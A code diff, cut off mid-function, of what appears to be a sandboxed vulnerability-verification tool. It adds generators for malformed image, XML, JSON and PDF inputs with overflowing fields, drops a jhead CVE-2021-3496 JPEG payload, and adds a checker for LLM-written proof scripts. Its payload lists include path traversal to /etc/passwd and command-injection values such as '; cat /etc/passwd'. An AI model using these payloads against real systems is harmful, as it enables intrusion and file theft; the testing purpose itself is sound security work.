@@ -7,9 +7,9 @@ import json
 import re
 import ast
 import os
-from typing import Dict, Optional, Any, List
+from typing import Dict, Optional, Any, List, Callable
 from pathlib import Path
-from datetime import datetime
+from datetime import datetime, timezone
 
 from langchain_core.messages import SystemMessage, HumanMessage
 
@@ -99,140 +99,44 @@ def _resolution_status_from_gate(gate_blocking: List[str]) -> str:
 # ---------------------------------------------------------------------------
 # Format-aware payload library
 # ---------------------------------------------------------------------------
+# FIX-1: Payloads are now generated from format-class strategies, not hardcoded
+# per-CVE byte sequences. Each generator produces structurally valid containers
+# with overflow-triggering dimensions so any parser of that format is exercised.
 # Exposed as a top-level function so docker_runner can import and call it
 # directly for the format-rejection retry tier (Task 0b).
 
-def get_format_payloads(ext: str) -> List[bytes]:
-    """Return a list of binary payloads for the given file extension.
+_EXT_TO_FORMAT = {
+    '.jpg': 'image', '.jpeg': 'image', '.png': 'image', '.gif': 'image',
+    '.tif': 'image', '.tiff': 'image', '.webp': 'image', '.bmp': 'image',
+    '.pdf': 'document',
+    '.xml': 'xml', '.xsd': 'xml', '.svg': 'xml', '.xhtml': 'xml', '.dtd': 'xml',
+    '.json': 'json',
+    '.tar': 'archive', '.gz': 'archive', '.zip': 'archive', '.bz2': 'archive',
+    '.mp3': 'media', '.mp4': 'media', '.wav': 'media', '.avi': 'media',
+}
 
-    Each payload has a structurally valid magic/header prefix so that
-    format-validating parsers (e.g. jhead) accept the file as the correct
-    type and actually reach the vulnerable parsing code.  The payloads
-    carry oversized internal fields that overflow the parser.
 
-    Args:
-        ext: file extension with leading dot, e.g. '.jpg', '.png'. Pass
-             '' or an unrecognised extension to get the generic set.
-    Returns:
-        List of bytes payloads, ordered from most-specific to generic.
-    """
-    # Minimal SOS section: jhead takes case M_SOS -> return TRUE without reading more markers.
-    # SOS length=12: 2 (Ns) + 2*Ns component entries + 3 bytes spec = 2+2+3+... standard is 12.
-    _SOS = b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
-
-    # Canon maker note JPEG — exercises ProcessCanonMakerNoteDir code path (CVE-2021-3496).
-    # IFD0 has TAG_MAKE="Canon" and TAG_MAKER_NOTE pointing to a Canon IFD with Tag=1,
-    # Components=17, ByteCount=34.  With an ASan-instrumented jhead the -n%99i argv exploit
-    # is the preferred crash trigger; this payload exercises the Canon branch for completeness.
-    import struct as _struct
-    _NUM_IFD0 = 2
-    _IFD0_START = 8
-    _IFD0_SIZE = 2 + 12 * _NUM_IFD0 + 4   # 34
-    _IFD0_END = _IFD0_START + _IFD0_SIZE   # 42
-    _MAKE_OFFSET = _IFD0_END               # 42
-    _MAKE_STR = b'Canon\x00'               # 6 bytes
-    _MN_OFFSET = _MAKE_OFFSET + len(_MAKE_STR)  # 48
-    _MN_IFD_SIZE = 2 + 12 * 1 + 4         # 18
-    _DATA_OFFSET = _MN_OFFSET + _MN_IFD_SIZE    # 66
-    _DATA = b'\x00' * 34                   # 17 * sizeof(short)
-    _TIFF_LEN = _DATA_OFFSET + len(_DATA)  # 100
-    _tiff = bytearray(_TIFF_LEN)
-    _struct.pack_into('<HHI', _tiff, 0, 0x4949, 0x002A, _IFD0_START)
-    _struct.pack_into('<H',   _tiff, _IFD0_START, _NUM_IFD0)
-    _struct.pack_into('<HHII', _tiff, _IFD0_START + 2,      0x010F, 2, 6, _MAKE_OFFSET)
-    _struct.pack_into('<HHII', _tiff, _IFD0_START + 2 + 12, 0x927C, 7, _MN_IFD_SIZE + len(_DATA), _MN_OFFSET)
-    _struct.pack_into('<I',   _tiff, _IFD0_START + 2 + 24, 0)
-    _tiff[_MAKE_OFFSET:_MAKE_OFFSET + 6] = _MAKE_STR
-    _struct.pack_into('<H',   _tiff, _MN_OFFSET, 1)
-    _struct.pack_into('<HHII', _tiff, _MN_OFFSET + 2, 0x0001, 3, 17, _DATA_OFFSET)
-    _struct.pack_into('<I',   _tiff, _MN_OFFSET + 2 + 12, 0)
-    _canon_exif = b'Exif\x00\x00' + bytes(_tiff)
-    _canon_app1_len = len(_canon_exif) + 2
-    _CANON_JPEG = (
-        b'\xff\xd8'
-        + b'\xff\xe1'
-        + _struct.pack('>H', _canon_app1_len)
-        + _canon_exif
-        + _SOS
-    )
-    del _struct, _tiff, _canon_exif  # clean up temp vars
-
-    _JPEG: List[bytes] = [
-        # Canon maker note JPEG — valid IFD structure with TAG_MAKE="Canon" + TAG_MAKER_NOTE
-        # Routes to ProcessCanonMakerNoteDir; triggers the CVE-2021-3496 code path.
-        _CANON_JPEG,
-        # SOI + small JFIF APP0 (16 bytes, minimum valid) + overlong APP1 Exif (65532 bytes content)
-        # -> jhead processes Exif IFD with entry count=65535, then hits SOS and returns TRUE
-        b'\xff\xd8'                              # SOI
-        + b'\xff\xe0\x00\x10'                    # APP0 marker + length=16 (minimal JFIF)
-        + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'  # 14 bytes JFIF content
-        + b'\xff\xe1' + b'\xff\xfe'              # APP1 Exif marker + length=65534 (content=65532)
-        + b'Exif\x00\x00'                        # Exif identifier (6 bytes)
-        + b'II\x2a\x00'                          # TIFF LE header (4 bytes)
-        + b'\x08\x00\x00\x00'                    # IFD0 offset=8 (4 bytes)
-        + b'\xff\xff'                            # IFD0 entry count=65535 (2 bytes) OVERFLOW
-        + b'B' * (65532 - 6 - 4 - 4 - 2)        # pad rest of APP1 segment
-        + _SOS,                                  # SOS -> jhead returns TRUE cleanly
-        # SOI + APP1 Exif only (no JFIF): direct EXIF parser path, entry count overflow
-        b'\xff\xd8'                              # SOI
-        + b'\xff\xe1' + b'\xff\xfe'              # APP1 Exif marker + length=65534
-        + b'Exif\x00\x00'                        # Exif identifier
-        + b'II\x2a\x00'                          # TIFF LE header
-        + b'\x08\x00\x00\x00'                    # IFD0 offset=8
-        + b'\xff\xff'                            # entry count=65535 OVERFLOW
-        + b'B' * (65532 - 6 - 4 - 4 - 2)        # pad
-        + _SOS,                                  # SOS -> clean exit
-        # SOI + max-length COM comment + SOS (tests comment parsing path)
-        b'\xff\xd8'                              # SOI
-        + b'\xff\xfe' + b'\xff\xfe'              # COM marker + length=65534 (content=65532)
-        + b'C' * 65532                           # comment content
-        + _SOS,                                  # SOS -> clean exit
-    ]
-    _PNG: List[bytes] = [
-        # Valid PNG sig + IHDR with width/height=0xffffffff (integer overflow in dim reader)
-        b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR'
-        + b'\xff\xff\xff\xff' + b'\xff\xff\xff\xff'
-        + b'\x08\x02\x00\x00\x00' + b'A' * 4096,
-    ]
-    _GIF: List[bytes] = [
-        b'GIF89a' + b'\xff\xff' + b'\xff\xff' + b'\xf7\x00\x00' + b'A' * 65530,
-    ]
-    _TIFF: List[bytes] = [
-        b'II*\x00' + b'\xff' * 65536,  # TIFF LE with overflowed IFD offset
-        b'MM\x00*' + b'\xff' * 65536,  # TIFF BE
-    ]
-    _WEBP: List[bytes] = [
-        b'RIFF' + b'\xff\xff\xff\xff' + b'WEBP' + b'A' * 65530,
-    ]
-    _BMP: List[bytes] = [
-        b'BM' + b'\xff\xff\xff\xff' + b'\x00' * 4 + b'\x36\x00\x00\x00' + b'A' * 65530,
-    ]
-    _SOS_GENERIC = b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
-    _GENERIC: List[bytes] = [
-        # JPEG: SOI + small JFIF APP0 (16 bytes) + Exif APP1 overflow + SOS
-        b'\xff\xd8'
-        + b'\xff\xe0\x00\x10'
-        + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
-        + b'\xff\xe1' + b'\xff\xfe'
-        + b'Exif\x00\x00' + b'II\x2a\x00' + b'\x08\x00\x00\x00' + b'\xff\xff'
-        + b'B' * (65532 - 6 - 4 - 4 - 2)
-        + _SOS_GENERIC,
-        b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR' + b'\xff' * 4096,
-        b'GIF89a' + b'\xff\xff' + b'\xff\xff' + b'A' * 65530,
-        b'%PDF-1.4\n' + b'A' * 65536,
-        b'A' * 65536,
-    ]
-    _XML: List[bytes] = [
-        # Well-formed XML with deeply nested elements — hits recursion/buffer limits
+def _generate_xml_payloads() -> List[bytes]:
+    """XML payloads: deep nesting, huge attrs, entity expansion, invalid tokens."""
+    return [
+        # Deeply nested elements — hits recursion/buffer limits
         b'<?xml version="1.0"?>\n<root>' + b'<a>' * 10000 + b'X' * 65536 + b'</a>' * 10000 + b'</root>',
         # Overlong attribute value
         b'<?xml version="1.0"?><root attr="' + b'A' * 65536 + b'"/>',
-        # Invalid token after valid header — triggers parse error path
-        b'<?xml version="1.0"?><root>\x00\xff\xfe' + b'B' * 65536 + b'</root>',
         # Entity expansion (billion laughs lite)
         b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "' + b'A' * 8192 + b'">]><x>&a;&a;&a;&a;&a;&a;&a;&a;</x>',
+        # Invalid token after valid header — triggers parse error path
+        b'<?xml version="1.0"?><root>\x00\xff\xfe' + b'B' * 65536 + b'</root>',
+        # Huge number of attributes on one element
+        b'<?xml version="1.0"?><root ' + b' '.join(f'a{i}="v"'.encode() for i in range(5000)) + b'/>',
+        # Very long element name
+        b'<?xml version="1.0"?><' + b'a' * 65536 + b'/>',
     ]
-    _JSON: List[bytes] = [
+
+
+def _generate_json_payloads() -> List[bytes]:
+    """JSON payloads: deep arrays, huge strings, bad UTF-8, numeric overflow."""
+    return [
         # Deeply nested array — hits recursion depth limit
         b'[' * 100000 + b'1' + b']' * 100000,
         # Overlong string value
@@ -241,20 +145,294 @@ def get_format_payloads(ext: str) -> List[bytes]:
         b'{"n": ' + b'9' * 65536 + b'}',
         # Invalid UTF-8 inside string
         b'{"k": "' + b'\xff\xfe' * 32768 + b'"}',
+        # Deeply nested objects
+        b'{"a":' * 50000 + b'1' + b'}' * 50000,
+        # Huge number of keys
+        b'{' + b','.join(f'"k{i}":1'.encode() for i in range(10000)) + b'}',
     ]
-    _MAP: Dict[str, List[bytes]] = {
-        '.jpg':  _JPEG + _GENERIC,
-        '.jpeg': _JPEG + _GENERIC,
-        '.png':  _PNG  + _GENERIC,
-        '.gif':  _GIF  + _GENERIC,
-        '.tif':  _TIFF + _GENERIC,
-        '.tiff': _TIFF + _GENERIC,
-        '.webp': _WEBP + _GENERIC,
-        '.bmp':  _BMP  + _GENERIC,
-        '.xml':  _XML  + _GENERIC,
-        '.json': _JSON + _GENERIC,
-    }
-    return _MAP.get(ext.lower(), _GENERIC)
+
+
+def _generate_image_payloads(ext: str) -> List[bytes]:
+    """Image payloads: valid magic + overflow in format-specific chunk types."""
+    ext_lower = ext.lower()
+    # SOS section that makes JPEG parsers return cleanly after the payload
+    _SOS = b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
+    payloads: List[bytes] = []
+
+    if ext_lower in ('.jpg', '.jpeg'):
+        # SOI + small JFIF APP0 + overlong APP1 Exif with IFD entry count overflow + SOS
+        payloads.append(
+            b'\xff\xd8'
+            + b'\xff\xe0\x00\x10'
+            + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
+            + b'\xff\xe1' + b'\xff\xfe'
+            + b'Exif\x00\x00' + b'II\x2a\x00' + b'\x08\x00\x00\x00' + b'\xff\xff'
+            + b'B' * (65532 - 6 - 4 - 4 - 2)
+            + _SOS
+        )
+        # APP1 only (no JFIF) — exercises direct EXIF parser path
+        payloads.append(
+            b'\xff\xd8'
+            + b'\xff\xe1' + b'\xff\xfe'
+            + b'Exif\x00\x00' + b'II\x2a\x00' + b'\x08\x00\x00\x00' + b'\xff\xff'
+            + b'B' * (65532 - 6 - 4 - 4 - 2)
+            + _SOS
+        )
+        # Max-length COM comment
+        payloads.append(
+            b'\xff\xd8'
+            + b'\xff\xfe' + b'\xff\xfe'
+            + b'C' * 65532
+            + _SOS
+        )
+        # Oversized APP2 ICC profile
+        payloads.append(
+            b'\xff\xd8'
+            + b'\xff\xe2' + b'\xff\xfe'
+            + b'ICC_PROFILE\x00'
+            + b'D' * 65520
+            + _SOS
+        )
+    elif ext_lower == '.png':
+        # Valid PNG sig + IHDR with width/height=0xffffffff (integer overflow)
+        payloads.append(
+            b'\x89PNG\r\n\x1a\n'
+            + b'\x00\x00\x00\rIHDR'
+            + b'\xff\xff\xff\xff' + b'\xff\xff\xff\xff'
+            + b'\x08\x02\x00\x00\x00' + b'A' * 4096
+        )
+        # Oversized tEXt chunk
+        payloads.append(
+            b'\x89PNG\r\n\x1a\n'
+            + b'\x00\x00\x00\rIHDR'
+            + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01'
+            + b'\x08\x02\x00\x00\x00'
+            + b'\x00\x01\x00\x00tEXt'
+            + b'A' * 65536
+        )
+    elif ext_lower == '.gif':
+        payloads.append(
+            b'GIF89a' + b'\xff\xff' + b'\xff\xff' + b'\xf7\x00\x00' + b'A' * 65530
+        )
+    elif ext_lower in ('.tif', '.tiff'):
+        payloads.append(b'II*\x00' + b'\xff' * 65536)  # TIFF LE overflowed IFD
+        payloads.append(b'MM\x00*' + b'\xff' * 65536)  # TIFF BE
+    elif ext_lower == '.webp':
+        payloads.append(b'RIFF' + b'\xff\xff\xff\xff' + b'WEBP' + b'A' * 65530)
+    elif ext_lower == '.bmp':
+        payloads.append(b'BM' + b'\xff\xff\xff\xff' + b'\x00' * 4 + b'\x36\x00\x00\x00' + b'A' * 65530)
+    else:
+        # Generic image: try JPEG + PNG magic
+        payloads.append(
+            b'\xff\xd8'
+            + b'\xff\xe0\x00\x10'
+            + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
+            + b'\xff\xe1' + b'\xff\xfe'
+            + b'Exif\x00\x00' + b'II\x2a\x00' + b'\x08\x00\x00\x00' + b'\xff\xff'
+            + b'B' * (65532 - 6 - 4 - 4 - 2)
+            + _SOS
+        )
+        payloads.append(
+            b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR' + b'\xff' * 4096
+        )
+    return payloads
+
+
+def _generate_generic_payloads() -> List[bytes]:
+    """Generic payloads for unknown or binary format files."""
+    _SOS = b'\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
+    return [
+        # JPEG with Exif overflow + SOS
+        b'\xff\xd8'
+        + b'\xff\xe0\x00\x10'
+        + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
+        + b'\xff\xe1' + b'\xff\xfe'
+        + b'Exif\x00\x00' + b'II\x2a\x00' + b'\x08\x00\x00\x00' + b'\xff\xff'
+        + b'B' * (65532 - 6 - 4 - 4 - 2)
+        + _SOS,
+        b'\x89PNG\r\n\x1a\n' + b'\x00\x00\x00\rIHDR' + b'\xff' * 4096,
+        b'GIF89a' + b'\xff\xff' + b'\xff\xff' + b'A' * 65530,
+        b'%PDF-1.4\n' + b'A' * 65536,
+        b'A' * 65536,
+    ]
+
+
+def _generate_document_payloads() -> List[bytes]:
+    """Document payloads for PDF and similar."""
+    return [
+        b'%PDF-1.4\n' + b'A' * 65536,
+        b'%PDF-1.7\n1 0 obj\n<</Length 99999>>\nstream\n' + b'X' * 65536 + b'\nendstream\nendobj',
+    ]
+
+
+# ── Issue #8: CWE-aware payload generation ──────────────────────────────────
+# Maps CWE IDs to targeted payload generators that exercise the specific
+# vulnerability class.  These are prepended to the format-specific payloads
+# so the tiered confirmation path tries the most relevant attacks first.
+
+_CWE_PAYLOAD_GENERATORS: Dict[str, Callable[[], List[bytes]]] = {}
+
+def _register_cwe_payload(*cwe_ids: str):
+    """Decorator to register a CWE-specific payload generator."""
+    def _decorator(func):
+        for cwe_id in cwe_ids:
+            _CWE_PAYLOAD_GENERATORS[cwe_id.lower()] = func
+        return func
+    return _decorator
+
+@_register_cwe_payload('cwe-121', 'cwe-122', 'cwe-124', 'cwe-126', 'cwe-127', 'cwe-787', 'cwe-788')
+def _buffer_overflow_payloads() -> List[bytes]:
+    """Payloads targeting stack/heap buffer overflows."""
+    return [
+        # Very long strings to trigger strcpy/memcpy overflow
+        b'A' * 131072,  # 128KB — exceeds most stack buffers
+        b'B' * 262144,  # 256KB — exceeds most heap allocations
+        # Patterned overflow for ASan detection
+        b'\x41' * 65536 + b'\x42' * 4096 + b'\x43' * 4096,
+        # Repeated format string to trigger sprintf overflow
+        b'%s' * 8192,
+        # Null-byte heavy to trigger off-by-one
+        b'A' * 4096 + b'\x00' * 256,
+    ]
+
+@_register_cwe_payload('cwe-125', 'cwe-788')
+def _buffer_overread_payloads() -> List[bytes]:
+    """Payloads targeting buffer over-reads."""
+    return [
+        # Short payloads that cause parser to read beyond allocation
+        b'\x00' * 4,
+        b'\xff\xff\xff\xff',
+        # Incomplete structure — parser reads past end
+        b'\x89PNG\r\n\x1a\n',  # PNG header only, no chunks
+        b'\xff\xd8\xff\xe0',    # JPEG SOI + APP0 marker only
+    ]
+
+@_register_cwe_payload('cwe-415', 'cwe-416')
+def _double_free_payloads() -> List[bytes]:
+    """Payloads targeting double-free / use-after-free."""
+    return [
+        # Repeated data that may cause parser to free same block twice
+        b'FREE' * 16384,
+        b'\x00' * 64 + b'FREE' * 8192 + b'\x00' * 64,
+    ]
+
+@_register_cwe_payload('cwe-190', 'cwe-191', 'cwe-680')
+def _integer_overflow_payloads() -> List[bytes]:
+    """Payloads targeting integer overflow/underflow."""
+    return [
+        # Length fields that overflow when multiplied
+        b'\xff\xff\xff\xff' + b'A' * 64,   # 0xFFFFFFFF length prefix
+        b'\x00\x00\x00\x80' + b'B' * 64,   # 0x80000000 — INT_MIN after negation
+        b'\xff\xff\xff\x7f' + b'C' * 64,   # 0x7FFFFFFF — INT_MAX
+    ]
+
+@_register_cwe_payload('cwe-22', 'cwe-73')
+def _path_traversal_payloads() -> List[bytes]:
+    """Payloads targeting path traversal / file injection."""
+    return [
+        b'../../etc/passwd',
+        b'....//....//....//etc/passwd',
+        b'/proc/self/environ',
+        b'..%2f..%2f..%2fetc%2fpasswd',
+        b'%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+    ]
+
+@_register_cwe_payload('cwe-78', 'cwe-77')
+def _command_injection_payloads() -> List[bytes]:
+    """Payloads targeting command injection."""
+    return [
+        b'; cat /etc/passwd',
+        b'| cat /etc/passwd',
+        b'$(cat /etc/passwd)',
+        b'`cat /etc/passwd`',
+        b'\n/bin/ls\n',
+    ]
+
+@_register_cwe_payload('cwe-476')
+def _null_deref_payloads() -> List[bytes]:
+    """Payloads targeting NULL pointer dereference."""
+    return [
+        b'',                     # Empty input — may cause NULL deref on missing arg
+        b'\x00' * 16,           # All-null bytes
+        b'\x00',                # Single null byte
+    ]
+
+@_register_cwe_payload('cwe-20')
+def _improper_validation_payloads() -> List[bytes]:
+    """Payloads targeting improper input validation."""
+    return [
+        b'\xff' * 4096,          # High bytes — may bypass signedness checks
+        b'\x80' * 4096,          # 0x80 bytes — sign-extension issues
+        b'\xfe\xff' * 2048,      # BOM-like — may confuse charset handling
+    ]
+
+
+def get_cwe_payloads(cwe_type: str) -> List[bytes]:
+    """Return CWE-specific payloads for the given vulnerability type.
+
+    Args:
+        cwe_type: CWE identifier like 'CWE-121' or 'cwe-787'
+    Returns:
+        List of bytes payloads targeting that vulnerability class.
+        Returns empty list if no specific generator exists.
+    """
+    cwe_key = str(cwe_type or '').strip().lower()
+    generator = _CWE_PAYLOAD_GENERATORS.get(cwe_key)
+    if generator:
+        return generator()
+    # Try numeric match: "CWE-121" -> "cwe-121"
+    import re as _cwe_re
+    m = _cwe_re.search(r'(\d+)', cwe_key)
+    if m:
+        cwe_key = f'cwe-{m.group(1)}'
+        generator = _CWE_PAYLOAD_GENERATORS.get(cwe_key)
+        if generator:
+            return generator()
+    return []
+
+
+def get_format_payloads(ext: str, probe_result: Optional[Any] = None) -> List[bytes]:
+    """Return a list of binary payloads for the given file extension.
+
+    FIX-1: Payloads are now generated from format-class strategies rather than
+    hardcoded per-CVE byte sequences. Each generator produces structurally valid
+    containers with overflow-triggering dimensions, making the tiered confirmation
+    path work for any parser of that format.
+
+    Args:
+        ext: file extension with leading dot, e.g. '.jpg', '.png'. Pass
+             '' or an unrecognised extension to get the generic set.
+        probe_result: Optional probe result for format hint resolution.
+    Returns:
+        List of bytes payloads, ordered from format-specific to generic.
+    """
+    # Resolve format class from probe hint if available, else from extension
+    format_hint = ''
+    if probe_result is not None:
+        format_hint = str(getattr(probe_result, 'probe_format_hint', '') or '').lower()
+    if not format_hint:
+        format_hint = _EXT_TO_FORMAT.get(ext.lower(), 'binary')
+
+    if format_hint == 'xml':
+        return _generate_xml_payloads() + _generate_generic_payloads()
+    elif format_hint == 'json':
+        return _generate_json_payloads() + _generate_generic_payloads()
+    elif format_hint == 'image':
+        return _generate_image_payloads(ext) + _generate_generic_payloads()
+    elif format_hint == 'document':
+        return _generate_document_payloads() + _generate_generic_payloads()
+    elif ext.lower() in _EXT_TO_FORMAT:
+        # Extension is known — dispatch to specific generator
+        fmt = _EXT_TO_FORMAT[ext.lower()]
+        if fmt == 'xml':
+            return _generate_xml_payloads() + _generate_generic_payloads()
+        elif fmt == 'json':
+            return _generate_json_payloads() + _generate_generic_payloads()
+        elif fmt == 'image':
+            return _generate_image_payloads(ext) + _generate_generic_payloads()
+        elif fmt == 'document':
+            return _generate_document_payloads() + _generate_generic_payloads()
+    return _generate_generic_payloads()
 
 
 class VerificationError(Exception):
@@ -270,6 +448,25 @@ class VulnerabilityVerifier:
         'unknown', 'none', 'n/a', 'main', 'constructor', '__init__',
         'undefined', 'null', 'true', 'false', 'init', 'setup',
         'vulnerable_binary', '', 'test', 'run', 'start', 'execute',
+        # C/C++ reserved keywords — regex can match `if (x) {` as a function definition
+        'if', 'else', 'while', 'for', 'do', 'switch', 'case', 'default',
+        'return', 'break', 'continue', 'goto', 'sizeof', 'typeof',
+        'struct', 'enum', 'union', 'void', 'class', 'namespace',
+        'try', 'catch', 'throw', 'new', 'delete', 'this', 'virtual',
+        'inline', 'extern', 'static', 'const', 'volatile', 'register',
+        'typedef', 'signed', 'unsigned', 'short', 'long', 'double',
+        'float', 'int', 'char', 'bool', 'auto', 'wchar_t',
+        # C standard library functions — regex matches fwrite(buf, n, 1, out) { as a function def
+        'fwrite', 'fread', 'fopen', 'fclose', 'fflush', 'fgets', 'fputs',
+        'fputc', 'fgetc', 'fprintf', 'fscanf', 'printf', 'scanf',
+        'sprintf', 'sscanf', 'snprintf', 'puts', 'gets', 'putchar',
+        'getchar', 'malloc', 'calloc', 'realloc', 'free', 'exit',
+        'abort', 'atoi', 'atol', 'strtol', 'strtoul', 'strdup',
+        'strlen', 'strcpy', 'strncpy', 'strcat', 'strncat', 'strcmp',
+        'strncmp', 'memcpy', 'memset', 'memmove', 'memcmp',
+        'open', 'close', 'read', 'write', 'lseek', 'pipe', 'dup',
+        'fork', 'exec', 'wait', 'kill', 'signal', 'raise',
+        'perror', 'errno', 'rand', 'srand', 'time', 'clock',
     })
 
     def __init__(self):
@@ -287,6 +484,9 @@ class VulnerabilityVerifier:
             return 'node'
         if ext == '.py':
             return 'python'
+        # HTML files with embedded JS are treated as JavaScript runtime
+        if ext in {'.html', '.htm'}:
+            return 'javascript'
         return ''
 
     def _infer_pov_script_runtime(self, pov_script: str) -> str:
@@ -328,6 +528,193 @@ class VulnerabilityVerifier:
             return str(e)
         except Exception as e:
             return str(e)
+
+    def _detect_common_pov_bugs(self, pov_script: str) -> List[str]:
+        """Detect common LLM-generated PoV script bugs before runtime execution.
+
+        Returns a list of human-readable issue strings that can be fed back
+        to the LLM for correction. This saves Docker container cycles by
+        catching obvious errors statically.
+        """
+        script = str(pov_script or '')
+        issues: List[str] = []
+        lines = script.splitlines()
+
+        # --- 1. text=True + .decode() bug ---
+        has_text_true = 'text=True' in script
+        has_decode = '.decode(' in script
+        if has_text_true and has_decode:
+            issues.append(
+                "CRITICAL BUG: You used subprocess.run(..., text=True) AND called .decode() on the result. "
+                "When text=True is set, result.stdout/result.stderr are already strings. "
+                "Calling .decode() on a string causes AttributeError. "
+                "FIX: Remove ALL .decode() calls when text=True is used. "
+                "Use: stdout = result.stdout or ''  (no .decode())."
+            )
+
+        # --- 2. Bracket access on os.environ (KeyError risk) ---
+        if "os.environ['TARGET_BINARY']" in script or 'os.environ["TARGET_BINARY"]' in script:
+            issues.append(
+                "CRITICAL BUG: You used os.environ['TARGET_BINARY'] with square brackets. "
+                "If the env var is missing, this raises KeyError and crashes the PoV. "
+                "FIX: Use os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN', '') instead."
+            )
+
+        # --- 3. Non-stdlib imports ---
+        if 'import requests' in script or 'from requests' in script:
+            issues.append(
+                "WARNING: The 'requests' library is NOT guaranteed to be installed in the proof container. "
+                "FIX: Use urllib.request from the Python standard library instead."
+            )
+
+        # --- 4. Hardcoded binary names ---
+        for line in lines:
+            stripped = line.strip()
+            # Match subprocess.run(['binary_name', ...]) where binary_name is a bare literal
+            # and not TARGET_BINARY or an env var reference
+            m = re.search(r"subprocess\.run\(\[(['\"])([a-zA-Z0-9_.-]+)\1", stripped)
+            if m:
+                bin_name = m.group(2)
+                if bin_name not in ('TARGET_BINARY', 'TARGET_BIN', 'binary', 'BINARY', 'cmd', 'command'):
+                    issues.append(
+                        f"WARNING: Hardcoded binary name '{bin_name}' in subprocess.run(). "
+                        f"The binary may not exist on PATH inside the container. "
+                        f"FIX: Use os.environ.get('TARGET_BINARY') as the first argv element."
+                    )
+                    break  # only report once
+
+        # --- 5. --help / --version invocations ---
+        if re.search(r"subprocess\.run\(\[.*('--help'|'--version')", script):
+            issues.append(
+                "WARNING: The PoV invokes the binary with --help or --version. "
+                "These never trigger vulnerabilities. "
+                "FIX: Pass real crafted input that exercises the vulnerable code path."
+            )
+
+        # --- 6. Bare binary invocation with no input ---
+        if re.search(r"subprocess\.run\(\[\s*(['\"])?TARGET_BINARY\1?\s*\]", script):
+            issues.append(
+                "WARNING: The PoV invokes the binary with no arguments or input. "
+                "Most CLI binaries ignore bare invocations or print help. "
+                "FIX: Pass a subcommand and crafted input data as arguments."
+            )
+
+        # --- 7. bytes input with text=True mismatch ---
+        if has_text_true and 'input=' in script:
+            # Check if input= is assigned a bytes literal or bytes variable
+            for line in lines:
+                if 'input=' in line and ('b\'' in line or 'b"' in line):
+                    issues.append(
+                        "CRITICAL BUG: You passed bytes input=... to subprocess.run() with text=True. "
+                        "This causes TypeError: a bytes-like object is required, not 'str'. "
+                        "FIX: Either (a) remove text=True and keep bytes input, or "
+                        "(b) decode the payload first: input=payload.decode('latin-1', errors='replace')."
+                    )
+                    break
+
+        # --- 8. Redeclaring TARGET_BINARY inside a function ---
+        in_function = False
+        for line in lines:
+            stripped = line.strip()
+            if stripped.startswith('def '):
+                in_function = True
+            if in_function and ('TARGET_BINARY' in stripped and '=' in stripped and 'os.environ' not in stripped):
+                if re.search(r'\bTARGET_BINARY\s*=\s*', stripped):
+                    issues.append(
+                        "WARNING: TARGET_BINARY is being reassigned inside a function. "
+                        "It is already set as a module-level variable by the harness. "
+                        "FIX: Remove the reassignment and use the module-level TARGET_BINARY directly."
+                    )
+                    break
+            if stripped and not stripped.startswith(' ') and not stripped.startswith('\t') and in_function:
+                # Heuristic: back to top-level indentation
+                in_function = False
+
+        # --- 9. Undefined variables ---
+        # Heuristic: detect bare identifiers used in os.path.exists(), open(), os.stat()
+        # that were never assigned earlier in the script.
+        assigned_vars = set()
+        for line in lines:
+            stripped = line.strip()
+            # Track assignments at module level and inside functions
+            m = re.match(r'^(\s*)([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*', stripped)
+            if m:
+                assigned_vars.add(m.group(2))
+        # Also include common builtins and module-level names that are safe
+        assigned_vars.update({
+            'os', 'subprocess', 'sys', 'tempfile', 'stat', 'json', 're',
+            'TARGET_BINARY', 'TARGET_BIN', 'CODEBASE_PATH', 'binary',
+            'result', 'argv', 'payload', 'stdout', 'stderr', 'stdout_text', 'stderr_text',
+        })
+        for idx, line in enumerate(lines):
+            stripped = line.strip()
+            # Look for os.path.exists(var), open(var), os.stat(var) where var is undefined
+            for func_pat in (r'os\.path\.exists\(([^)]+)\)', r'open\(([^)]+)\)', r'os\.stat\(([^)]+)\)'):
+                for m in re.finditer(func_pat, stripped):
+                    arg = m.group(1).strip()
+                    # Extract bare identifier (ignore string literals and attrs)
+                    arg_id = re.match(r'^([a-zA-Z_][a-zA-Z0-9_]*)$', arg)
+                    if arg_id:
+                        var_name = arg_id.group(1)
+                        if var_name not in assigned_vars and var_name not in ('__name__',):
+                            issues.append(
+                                f"CRITICAL BUG: Variable '{var_name}' is used on line {idx+1} "
+                                f"but is never defined or assigned in the script. "
+                                f"This causes NameError at runtime. "
+                                f"FIX: Assign a value to '{var_name}' before using it."
+                            )
+                            assigned_vars.add(var_name)  # only report once
+
+        # --- 10. Missing imports ---
+        # Map common module usage patterns to their required import statements
+        import_requirements = {
+            'stat.': 'import stat',
+            'json.': 'import json',
+            're.': 'import re',
+            'tempfile.': 'import tempfile',
+            'glob.': 'import glob',
+            'hashlib.': 'import hashlib',
+            'base64.': 'import base64',
+            'shutil.': 'import shutil',
+            'socket.': 'import socket',
+            'urllib.': 'import urllib.request',
+            'time.': 'import time',
+            'datetime.': 'import datetime',
+        }
+        has_imports = {imp: False for imp in import_requirements.values()}
+        for line in lines:
+            stripped = line.strip()
+            if stripped.startswith('import ') or stripped.startswith('from '):
+                for req_imp in import_requirements.values():
+                    mod_name = req_imp.replace('import ', '').split('.')[0]
+                    if mod_name in stripped:
+                        has_imports[req_imp] = True
+        for pattern, req_imp in import_requirements.items():
+            if pattern in script and not has_imports[req_imp]:
+                issues.append(
